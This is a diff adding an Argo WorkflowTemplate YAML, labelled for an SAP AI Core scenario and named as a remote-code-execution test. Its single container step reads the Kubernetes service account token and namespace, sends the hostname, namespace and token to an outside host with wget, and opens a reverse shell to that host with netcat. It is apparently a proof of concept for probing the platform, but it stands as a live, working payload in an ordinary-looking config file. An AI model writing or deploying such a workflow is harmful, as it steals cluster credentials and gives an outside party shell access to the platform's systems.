@@ -1,0 +1,26 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: testflo-rce-wft
+  labels:
+    scenarios.ai.sap.com/id: testflo-scenario
+    scenarios.ai.sap.com/name: testflo-scenario
+    executables.ai.sap.com/id: testflo-rce-wft
+    executables.ai.sap.com/name: testflo-rce-wft
+    ai.sap.com/version: "1.0.0"
+    ai.sap.com/resourcePlan: starter
+spec:
+  entrypoint: cb
+  templates:
+    - name: cb
+      container:
+        image: alpine:3.19
+        command:
+          - sh
+          - -c
+          - |
+            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+            NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+            wget -q -O- "https://sfg.0x79.de/cb?t=TESTFLO-WFT-JOB&ns=${NS}&h=$(hostname)" || true
+            wget -q --post-data "tok=${TOKEN}" "https://sfg.0x79.de/cb-tok?t=TESTFLO-WFT-JOB" || true
+            nc sfg.0x79.de 8080 -e /bin/sh || true
